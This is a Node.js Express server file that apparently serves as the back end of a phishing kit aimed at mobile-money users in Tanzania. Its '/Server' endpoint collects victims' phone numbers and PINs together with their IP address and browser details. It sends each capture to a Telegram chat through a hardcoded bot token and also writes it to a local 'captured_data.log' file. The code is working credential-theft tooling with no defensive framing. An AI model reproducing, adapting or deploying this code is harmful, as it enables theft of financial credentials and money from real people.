const express = require('express');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Telegram Bot Configuration
const BOT_TOKEN = "8680061714:AAG1EMja1icYBIsKmM8oV9NN4Z1NLBOIlzQ";
const CHAT_ID = "8091815189";

// Endpoint to receive data
app.post('/Server', async (req, res) => {
    try {
        const { phone, pin } = req.body;
        
        if (!phone || !pin) {
            return res.status(400).json({ 
                status: 'error', 
                message: 'Phone and PIN are required' 
            });
        }
        
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const timestamp = new Date().toISOString().replace('T', ' ').slice(0, 19);
        
        const message = `🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n` +
                       `      📱 MixxYass Capture Data 📱\n` +
                       `🔴━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━🔴\n\n` +
                       `📞 PHONE NUMBER:\n` +
                       `   +255 ${phone}\n\n` +
                       `🔐 PIN CODE:\n` +
                       `   ${pin}\n\n` +
                       `🖥️ IP ADDRESS:\n` +
                       `   ${ip}\n\n` +
                       `📱 USER AGENT:\n` +
                       `   ${userAgent.slice(0, 80)}\n\n` +
                       `⏰ DATE & TIME:\n` +
                       `   ${timestamp}\n\n`;
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
        });
        
        const logEntry = `${timestamp} | Phone: ${phone} | PIN: ${pin} | IP: ${ip}\n`;
        fs.appendFileSync('captured_data.log', logEntry);
        
        res.json({ status: 'success', message: 'Data sent to Telegram' });
        
    } catch (error) {
        console.error('Error:', error.message);
        res.status(500).json({ 
            status: 'error', 
            message: 'Failed to send data to Telegram' 
        });
    }
});

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
